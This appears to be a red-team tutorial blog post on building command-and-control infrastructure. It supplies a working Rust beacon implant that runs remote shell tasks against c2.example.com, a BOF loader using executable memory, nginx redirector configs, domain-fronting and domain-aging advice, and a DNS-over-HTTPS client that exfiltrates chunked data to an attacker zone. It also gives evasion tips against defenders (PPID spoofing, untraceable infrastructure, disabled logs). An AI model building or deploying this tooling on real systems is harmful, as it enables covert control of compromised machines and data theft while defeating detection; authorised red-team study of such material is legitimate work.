---
title: "Building a C2 Stack: Implants, BOF Loaders, Redirectors, and DoH Channels"
description: "A practical end-to-end guide to building command-and-control infrastructure - a minimal Rust implant, a COFF-parsing BOF loader, resilient redirector chains, and a DNS-over-HTTPS covert channel. How each layer fits together and where OPSEC attention actually pays off."
date: 2026-04-17
difficulty: Hard
tags: [c2, rust, bof, coff, redirectors, domain-fronting, doh, opsec]
---

Rolling your own C2 isn't about replacing Cobalt Strike. It's about understanding the pieces deeply enough to modify commercial tools when they get signatured, ship capabilities they don't have, and debug what's actually happening on the wire when a beacon stops calling back. This post walks the four layers that together make a working offensive C2 stack: the **implant** (the agent on the target), the **BOF loader** (how you extend the implant without recompiling), **redirector infrastructure** (how you survive being discovered), and a **covert channel** that blends beacon traffic into something the network already trusts.

## Layer 1: The Implant - A Minimal Rust Beacon

### Why Rust

C works. C++ works. But Rust compiles to static native binaries with no runtime, no CLR, no telemetry hooks inherited from a language framework. `cargo build --release` produces a 300KB binary with no extra DLL dependencies beyond the Windows imports you explicitly use. Rust's macros and type system make it easier to layer obfuscation (compile-time string encryption, syscall number patching) cleanly than C.

### Core Loop

The implant is a finite state machine:

```
Loop forever:
  1. sleep(base_interval + jitter_noise)
  2. POST https://c2/api/beacon → {session_id, host_info}
  3. Parse response → list of tasks
  4. For each task: execute, collect output
  5. POST /api/results → {task_id, output}
```

### Skeleton

```rust
use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use std::{thread, time::Duration};
use rand::Rng;

const BASE_INTERVAL: u64 = 30;  // seconds
const JITTER_PCT:    u64 = 20;

#[derive(Serialize)]
struct Checkin { session: String, host: String, user: String }

#[derive(Deserialize)]
struct Task { id: String, kind: String, arg: String }

fn main() {
    let client = Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .build().unwrap();

    let session = uuid::Uuid::new_v4().to_string();

    loop {
        // sleep with jitter
        let jitter = rand::thread_rng().gen_range(0..=(BASE_INTERVAL * JITTER_PCT / 100));
        thread::sleep(Duration::from_secs(BASE_INTERVAL - (BASE_INTERVAL * JITTER_PCT / 200) + jitter));

        // check in
        let resp = client.post("https://c2.example.com/api/beacon")
            .json(&Checkin {
                session: session.clone(),
                host: hostname::get().unwrap().to_string_lossy().into(),
                user: whoami::username(),
            })
            .send();

        let Ok(r) = resp else { continue };
        let Ok(tasks): Result<Vec<Task>, _> = r.json() else { continue };

        for t in tasks {
            let output = match t.kind.as_str() {
                "shell" => execute_shell(&t.arg),
                "bof"   => execute_bof(&t.arg),    // layer 2
                "exit"  => std::process::exit(0),
                _       => "unknown task".into(),
            };
            let _ = client.post("https://c2.example.com/api/results")
                .json(&serde_json::json!({"id": t.id, "output": output}))
                .send();
        }
    }
}
```

### Jitter math - why it matters

With 30s base and 20% jitter the actual interval ranges 27s-33s. That breaks periodicity detection - a SOC tool plotting beacon intervals won't see a perfect line. Go to 50% jitter in hostile environments and beacon slower (300s+) to hide in normal HTTPS request volume.

### OPSEC baseline for the implant

- **Strings**: encrypt literals at compile time (`litcrypt` / `obfstr` crates), decrypt on use.
- **PPID spoof** when spawning commands - child of `explorer.exe`, not `beacon.exe`.
- **Block child output** by default; fetch only when tasked.
- **Rotate User-Agent** per session.
- **TLS pinning** - embed the certificate hash, fail on mismatch, defeats Burp-style interception by blue team.

## Layer 2: The BOF Loader

### Why a Custom Loader

Cobalt Strike ships with a BOF loader. Rolling your own means you can execute the BOF ecosystem from *any* framework - Sliver, Mythic, Havoc, or a hand-rolled Rust implant. The BOF format is a standard COFF object file; loading it is a bounded engineering task.

### COFF Format Refresher

A compiled `.o` file has six components:

```
┌──────────────────────────┐
│ COFF File Header         │ machine type, section count, symtab offset
├──────────────────────────┤
│ Section Headers[]        │ per-section metadata (.text, .rdata, .data, .bss)
├──────────────────────────┤
│ Raw section data         │ machine code + constants
├──────────────────────────┤
│ Relocations[]            │ per-section: "patch offset X with symbol Y"
├──────────────────────────┤
│ Symbol Table             │ function & import names
├──────────────────────────┤
│ String Table             │ long symbol names (>8 chars)
└──────────────────────────┘
```

### Key Structures

```c
typedef struct {
    WORD  Machine;              // 0x8664 for x64
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader; // 0 for object files
    WORD  Characteristics;
} COFF_HEADER;

typedef struct {
    BYTE  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} SECTION_HEADER;

typedef struct {
    DWORD VirtualAddress;   // where in the section to patch
    DWORD SymbolTableIndex; // which symbol provides the value
    WORD  Type;             // how to compute the patch (rel32, addr64, etc.)
} RELOCATION;
```

### Loader Flow

1. **Read the BOF file** into memory.
2. **Allocate** one `VirtualAlloc`'d RWX region per section, copy raw bytes.
3. **Walk symbols**. For each imported symbol:
   - `__imp_Beacon*` → your own dispatch function (`BeaconPrintf`, `BeaconDataParse`, etc.)
   - `__imp_<MODULE>$<function>` → `GetProcAddress(LoadLibraryA("<MODULE>.dll"), "<function>")`
   - Store resolved address in a side table indexed by symbol number.
4. **Apply relocations**. For each relocation:
   - Compute the patch value using the symbol table.
   - Patch based on `Type`:
     - `IMAGE_REL_AMD64_ADDR64` (0x01) → write full 64-bit absolute address.
     - `IMAGE_REL_AMD64_REL32`  (0x04) → write 32-bit displacement from patch site + 4.
     - `IMAGE_REL_AMD64_ADDR32NB` (0x03) → write RVA.
5. **Find the `go` symbol**, cast to `void (*)(char*, int)`, call with task arguments.
6. **Free** allocations after `go` returns.

### Beacon API Dispatch (the fun part)

The BOF calls `BeaconPrintf(CALLBACK_OUTPUT, "fmt", args...)`. Your loader implements it:

```c
void BeaconPrintf(int type, const char* fmt, ...) {
    char buf[4096];
    va_list ap; va_start(ap, fmt);
    vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, ap);
    va_end(ap);
    your_c2_send_result(type, buf, strlen(buf));  // ship it to teamserver
}
```

And `BeaconDataParse` + friends do the inverse: unpack the binary task argument into typed fields.

### Loading and Running

```c
void run_bof(BYTE* file, SIZE_T fileSize, char* args, int argLen) {
    COFF_HEADER* hdr = (COFF_HEADER*)file;
    SECTION_HEADER* sects = (SECTION_HEADER*)(file + sizeof(*hdr));

    // Allocate + copy sections
    PVOID* sect_mem = calloc(hdr->NumberOfSections, sizeof(PVOID));
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        sect_mem[i] = VirtualAlloc(NULL, sects[i].SizeOfRawData,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (sects[i].PointerToRawData)
            memcpy(sect_mem[i], file + sects[i].PointerToRawData, sects[i].SizeOfRawData);
    }

    // Resolve imports, apply relocations, find `go`, call it...
    // (omitted for length - the full loader is ~300 lines of C)

    // Cleanup
    for (int i = 0; i < hdr->NumberOfSections; i++)
        VirtualFree(sect_mem[i], 0, MEM_RELEASE);
    free(sect_mem);
}
```

Full working implementations worth studying:
- `trustedsec/COFFLoader` - canonical open-source reference
- `Yaxser/COFFLoader2` - with symbol obfuscation
- `RtlDallas/NiCOFF` - Rust implementation for Rust implants

## Layer 3: Redirector Infrastructure

Pointing implants directly at your teamserver is a single point of failure. The moment the teamserver IP is burned, every beacon in the engagement is dead. The solution: **disposable redirector servers** that proxy valid C2 traffic to the teamserver and serve decoy content for everything else.

### Typical Topology

```
[ implant ] → [ CDN (optional) ] → [ redirector VPS ] → [ teamserver ]
     ↑                                    ↓
  public IP                          operator VPN only
```

- Redirector IP is on the implant's C2 config.
- Teamserver is inside a VPN only you can reach.
- Redirector can be burned and rebuilt in 10 minutes.

### Minimal Nginx Redirector

```nginx
server {
    listen 443 ssl http2;
    server_name cdn.totally-legit.com;

    ssl_certificate     /etc/letsencrypt/live/cdn.totally-legit.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.totally-legit.com/privkey.pem;

    # Lock down to the malleable profile's URIs + User-Agent
    if ($http_user_agent !~ "Mozilla/5\.0 \(Windows NT 10\.0.*AppleWebKit") {
        return 301 https://www.wikipedia.org;
    }

    location /api/beacon {
        proxy_pass https://teamserver.internal;
        proxy_set_header Host            $host;
        proxy_set_header X-Real-IP       $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    location /api/results {
        proxy_pass https://teamserver.internal;
        proxy_set_header Host $host;
    }

    # Everything else → decoy
    location / {
        return 301 https://www.wikipedia.org;
    }
}
```

The rule is: **if it doesn't look like my implant's traffic, it doesn't reach my teamserver**. Blue teams fingerprinting the C2 infrastructure see a normal-looking CDN host that 301s away on unexpected requests.

### Domain Fronting (when CDN supports it)

TLS SNI and HTTP `Host` header can differ. Firewalls make policy decisions on SNI (encrypted but parseable in ClientHello); the CDN routes on `Host`. Put a trusted CDN domain in SNI, your evil one in `Host`:

```
GET /api/beacon HTTP/1.1
Host: cdn.totally-legit.com          ← CDN routes here
User-Agent: Mozilla/5.0 ...
                                      ← SNI in TLS: www.cdn-of-big-tech.com
```

Blue team sees the SNI (trusted CDN). Traffic is encrypted. CDN internally forwards to your redirector. This was the technique that made AWS CloudFront, Google App Engine, and Fastly popular for C2 - until those providers started blocking it. As of 2026 it still works on Cloudfront + a compliant origin, on Azure Front Door, and on a handful of smaller CDNs.

### Categorization

Fresh domains look suspicious to proxies and URL filters. Age domains for **30-90 days** by:
- Registering months in advance
- Running `expireddomains.net`-style searches for dropped aged domains with categorization intact
- Submitting to Cisco Umbrella and Bluecoat for "Business" or "Computers & Internet" categorization before use
- Populating with benign content - a few pages about the fake business

### OPSEC Checklist for Infrastructure

- Domain: aged ≥ 30 days, categorized, no WHOIS link to your ops identity
- Registrar: accepts privacy, no payment traceable to you
- VPS provider: accepts crypto, rotate per engagement
- SSL: Let's Encrypt (free, ubiquitous, blends in)
- Teamserver access: **only via VPN**; firewall off port 80/443 from the internet
- Logs on redirector: disabled (`access_log off;` in nginx)
- Redirector rebuild script: fully automated, 5 min from zero to ready

## Layer 4: DNS-over-HTTPS Covert Channel

When HTTPS to your own domain is too suspicious, DoH is the escape hatch. The implant sends DNS queries as HTTPS requests to a public resolver (Cloudflare's `1.1.1.1`, Google's `8.8.8.8`). To any network monitor, the implant is making legitimate HTTPS requests to a trusted CDN - indistinguishable from a browser using secure DNS.

### How the Channel Works

```
Implant:   HTTPS POST https://cloudflare-dns.com/dns-query
           Body: DNS query for <cmd_id>.c2.yourdomain.com TXT
                                          ↓
Cloudflare recurses to your authoritative nameserver
                                          ↓
Your NS returns a TXT record encoding the next task
                                          ↓
Implant: decodes TXT, executes, sends results via A-record lookups:
           HTTPS POST ... query for <chunk1>.<chunk2>.exfil.c2.yourdomain.com
```

### Why It Evades Detection

- All traffic is **HTTPS to Cloudflare's well-known public IP**. Zero signals at the network layer.
- The implant doesn't even need a custom DNS resolver; it speaks DoH directly.
- DNS monitoring tools (Passive DNS, Bro/Zeek DNS parsing) never see your queries - they're inside encrypted HTTP bodies.
- Cloudflare caches recursive results - from the target's network, queries might not even egress on every beacon.

### Minimal Client (Python Illustration)

```python
import base64, requests
from dns import message, rdatatype

SESSION  = "abc123"
C2_ZONE  = "c2.yourdomain.com"
RESOLVER = "https://cloudflare-dns.com/dns-query"

def doh_query(name, qtype=rdatatype.TXT):
    msg = message.make_query(name, qtype)
    r = requests.post(RESOLVER, data=msg.to_wire(),
                      headers={"Content-Type": "application/dns-message"})
    return message.from_wire(r.content)

def poll():
    ans = doh_query(f"{SESSION}.beacon.{C2_ZONE}")
    for rr in ans.answer:
        for item in rr.items:
            cmd = base64.b64decode(str(item).strip('"')).decode()
            return cmd
    return None

def exfil(session, result, chunk_size=60):
    blob = base64.urlsafe_b64encode(result.encode()).decode().rstrip("=")
    for i in range(0, len(blob), chunk_size):
        chunk = blob[i:i+chunk_size]
        doh_query(f"{chunk}.{session}.exfil.{C2_ZONE}", qtype=rdatatype.A)
```

### Authoritative Nameserver Side

On the server side, you run an authoritative DNS server (`dnslib`, `bindserver`, or CoreDNS with a plugin) that:

1. Receives queries for `<session>.beacon.c2.yourdomain.com`
2. Looks up the next task for that session
3. Returns the base64-encoded task as a TXT record
4. Receives `<chunk>.<session>.exfil.c2.yourdomain.com` lookups
5. Reassembles chunks per-session into the original result blob

### Throughput & Limits

- Max TXT record: ~255 bytes per string, multiple strings allowed
- Max DNS name: 253 chars total, 63 per label - practical chunk size ~60 bytes
- Beacon cadence: one query every 30-60 seconds blends in; faster starts to look anomalous

Not great for large exfil. Use DoH for **command-and-control only** - task/result channels. For bulk data, switch to a second covert channel (file upload to a legitimate-looking blob storage, SSH out of the domain you own, or split across multiple beacons).

### Detection

Advanced defenders with TLS inspection (MITM proxy) can see the decrypted DoH body. Indicators:

- Periodic DoH queries with same label prefix (your session ID)
- TXT record queries at volume from one host
- Base64 patterns inside DNS labels

Mitigations on your side:

- Rotate session IDs over time
- Use realistic-looking subdomains (`api`, `analytics`, `cdn`) rather than `beacon` / `exfil`
- Blend with real browser DoH traffic - fire background queries for real TLD domains too
- Switch to `application/dns-json` format for variety

## How the Layers Fit

A real engagement looks like this:

```
Rust implant  (Layer 1) sleeps with jitter
      ↓
beacons over HTTPS via a CDN  (Layer 3 - redirector)
      ↓
CDN routes to disposable redirector VPS
      ↓
redirector filters malformed traffic, forwards valid C2 to teamserver (VPN-only)
      ↓
teamserver responds with a task; if it's "run this BOF":
      ↓
implant loads BOF with the COFF loader  (Layer 2)
      ↓
BOF executes (e.g. Kerberoast, Shadow Credentials)
      ↓
results marshalled back over the same channel
```

When the primary redirector gets burned, the implant has a secondary **DoH channel** (Layer 4) as fallback. Implants are expected to live for days/weeks; single-channel C2 rarely does.

## Recommended Reading

- `Mr-Un1k0d3r/CobaltStrike-BOF-Templates` - BOF starting points with clean patterns
- `Helpsystems/nanodump` - production-grade BOF for LSASS mini-dumps
- `0xRick/DoH-C2` - reference DoH implementation
- RedSiege "Infrastructure for Red Teamers" - redirector + CDN design patterns

## Summary

Good C2 isn't a single piece of tooling. It's a **stack of independent, replaceable layers**: an implant that minimizes its footprint, a loader that lets you extend capabilities without ever redeploying, redirector infrastructure that survives discovery, and covert channels that survive outright blocking. Learn each layer deeply - not to replace commercial tools, but so that when they fail, you can fix it.

> The best operators don't have a better C2. They have a C2 they understand layer-by-layer, so nothing surprises them mid-engagement.
